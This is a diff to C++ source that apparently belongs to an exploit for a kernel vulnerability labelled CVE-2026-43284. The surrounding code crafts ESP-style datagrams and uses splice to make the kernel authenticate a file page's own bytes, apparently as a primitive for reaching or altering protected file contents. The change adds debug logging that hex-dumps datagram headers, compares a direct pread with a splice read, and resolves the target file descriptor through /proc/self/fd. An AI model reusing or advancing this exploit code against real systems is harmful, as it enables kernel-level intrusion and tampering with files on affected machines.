@@ -18,6 +18,8 @@
  *  needed: the table measured that the old value was a code default with no other writer, and a
  *  protocol constant is not a setting.
  */
+#include <fcntl.h>
+#include <unistd.h>
 #include "jni/gl_log.hpp"
 #include <array>
 #include <cstddef>
@@ -148,7 +150,10 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             std::array<std::uint8_t, kMaxDatagramBytes> datagram{};
             store_be32(datagram.data(), spi_);
             store_be32(datagram.data() + 4U, next_seq_);
-            GL_LOGI("window: sending seq=%u window=%p", next_seq_, static_cast<const void *>(this));
+            GL_LOGI("window: send seq=%u offset=%llu hdr=%02x%02x%02x%02x%02x%02x%02x%02x", next_seq_,
+                        static_cast<unsigned long long>(position),
+                        datagram[0], datagram[1], datagram[2], datagram[3],
+                        datagram[4], datagram[5], datagram[6], datagram[7]);
             /* The check covers what the wire will carry, and the wire carries the page's own bytes in
              * the ciphertext slot -- splice_one substitutes them there. Putting the desired block in
              * this slot instead would authenticate bytes nobody sends, and the kernel, which verifies
@@ -189,6 +194,20 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             /* Into a local, copied out only for a whole block: a surface that wrote a partial
              *  block straight into the caller's buffer would leave bytes that look like data. */
             std::uint8_t block[kBlockBytes] = {};
+            /* 现场对照：同一个 fd 上"直接 pread"与"splice 读"的内容 —— 分开「fd 不对」与「读法不对」。 */
+            {
+                std::uint8_t direct[kBlockBytes] = {};
+                const long got = ::pread(doors_.file_fd(), direct, kBlockBytes, static_cast<off_t>(position));
+                GL_LOGI("read_block: fd=%d pos=%llu pread=%ld direct=%02x%02x%02x%02x",
+                        doors_.file_fd(), static_cast<unsigned long long>(position), got,
+                        direct[0], direct[1], direct[2], direct[3]);
+                char link[256] = {};
+                char link_path[64] = {};
+                std::snprintf(link_path, sizeof(link_path), "/proc/self/fd/%d", doors_.file_fd());
+                const ssize_t got_link = ::readlink(link_path, link, sizeof(link) - 1U);
+                GL_LOGI("read_block: fd=%d flags=0x%x link=%s", doors_.file_fd(),
+                        ::fcntl(doors_.file_fd(), F_GETFL), got_link > 0 ? link : "(none)");
+            }
             if (splice_.read_at(doors_.file_fd(), block, kBlockBytes, position) !=
                 static_cast<long>(kBlockBytes)) {
                 read_outcome_ = ReadOutcome::Incomplete;
